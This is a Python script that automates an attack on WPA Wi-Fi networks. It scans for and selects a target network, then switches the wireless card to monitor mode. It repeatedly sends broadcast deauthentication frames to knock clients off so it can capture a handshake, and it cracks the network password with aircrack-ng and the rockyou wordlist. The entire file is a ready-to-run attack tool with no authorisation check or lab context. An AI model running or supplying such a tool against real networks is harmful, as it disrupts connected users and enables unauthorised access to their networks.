import os
import sys
import subprocess
import platform
import time
import signal

def run_cmd(cmd, capture=False):
    try:
        if capture:
            return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode().strip()
        return subprocess.run(cmd, shell=True)
    except Exception:
        return None

def check_for_handshake(cap_file, bssid):
    if not os.path.exists(cap_file):
        return False
    # Verification using aircrack-ng to ensure the handshake is valid
    output = run_cmd(f"aircrack-ng -b {bssid} {cap_file}", capture=True)
    return output and ("1 handshake" in output or "WPA (" in output)

def get_actual_mon_iface():
    """Detects the current monitor mode interface name dynamically."""
    ifaces = run_cmd("iw dev | grep Interface", capture=True)
    if not ifaces: return None
    # Look for interfaces ending in 'mon' or listed as monitor type
    for line in ifaces.split('\n'):
        name = line.split()[-1]
        mode_check = run_cmd(f"iw dev {name} info", capture=True)
        if "type monitor" in mode_check:
            return name
    return None

def main():
    if platform.system() != "Linux" or os.geteuid() != 0:
        print("❌ Error: This script requires Linux and 'sudo'.")
        sys.exit(1)

    # 1. PRE-FLIGHT CLEANUP
    print("[*] Cleaning up old sessions...")
    run_cmd("rm -f capture_output-0*")

    # 2. SCANNING (using nmcli for speed)
    print("[*] Scanning for WiFi networks...")
    scan_raw = run_cmd("nmcli -t -f SSID,BSSID,CHAN device wifi list", capture=True)
    if not scan_raw:
        print("❌ No networks found. Is your Wi-Fi on?"); sys.exit(1)

    networks = []
    print(f"\n{'No.':<4} {'SSID':<25} {'BSSID':<18} {'CHAN'}")
    print("-" * 65)
    for i, line in enumerate(scan_raw.split('\n')):
        if not line.strip() or line.count(':') < 6: continue
        p = line.split(':')
        # Handle cases where SSID might be empty (Hidden)
        ssid = p[0] if p[0] else "<Hidden>"
        bssid = ":".join(p[1:7])
        chan = p[-1]
        networks.append({'ssid': ssid, 'bssid': bssid, 'chan': chan})
        print(f"{i+1:<4} {ssid[:24]:<25} {bssid:<18} {chan}")

    # 3. SELECTION
    try:
        choice = int(input("\n[?] Select Target Number: ")) - 1
        target = networks[choice]
        duration = int(input("[?] Max wait time (Default 90s): ") or 90)
        wordlist = input("[?] Wordlist path (Default rockyou.txt): ") or "rockyou.txt"
    except:
        print("❌ Invalid selection."); sys.exit(1)

    # 4. MONITOR MODE SETUP
    orig_iface = run_cmd("iw dev | grep Interface | awk '{print $2}' | head -n 1", capture=True)
    print(f"[*] Enabling Monitor Mode on {orig_iface}...")
    run_cmd("airmon-ng check kill")
    run_cmd(f"airmon-ng start {orig_iface}")
    
    time.sleep(3) # Wait for interface to initialize
    mon_iface = get_actual_mon_iface()
    
    if not mon_iface:
        print("❌ Failed to find a monitor mode interface!"); sys.exit(1)

    try:
        print(f"[*] CAPTURING: {target['ssid']} | BSSID: {target['bssid']} | CH: {target['chan']}")
        
        # Start airodump-ng in background
        cap_proc = subprocess.Popen(
            f"airodump-ng -c {target['chan']} --bssid {target['bssid']} -w capture_output {mon_iface}", 
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid
        )

        # 5. SEARCH & DEAUTH LOOP
        start_time = time.time()
        handshake_found = False

        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            print(f"[*] Searching for handshake... {elapsed}/{duration}s", end="\r")

            # Deauth every 20 seconds
            if elapsed > 0 and elapsed % 20 == 0:
                # Use broadcast deauth since we don't have a specific client list yet
                run_cmd(f"aireplay-ng -0 5 -a {target['bssid']} {mon_iface} > /dev/null 2>&1")

            if check_for_handshake("capture_output-01.cap", target['bssid']):
                print(f"\n\n✅ SUCCESS: Handshake captured successfully!")
                handshake_found = True
                break
            
            time.sleep(2)

        # Kill capture process group
        os.killpg(os.getpgid(cap_proc.pid), signal.SIGINT)

        # 6. CRACKING
        if handshake_found:
            print(f"[*] Launching crack with {wordlist}...")
            run_cmd(f"aircrack-ng -b {target['bssid']} -w {wordlist} capture_output-01.cap")
        else:
            print(f"\n\n❌ Timeout reached. No handshake caught.")

    except KeyboardInterrupt:
        print("\n[!] User aborted.")
    finally:
        print("\n[*] Restoring system to Managed Mode...")
        run_cmd(f"airmon-ng stop {mon_iface}")
        run_cmd("systemctl start NetworkManager")
        print("✅ NetworkManager restarted. Done.")

if __name__ == "__main__":
    main()
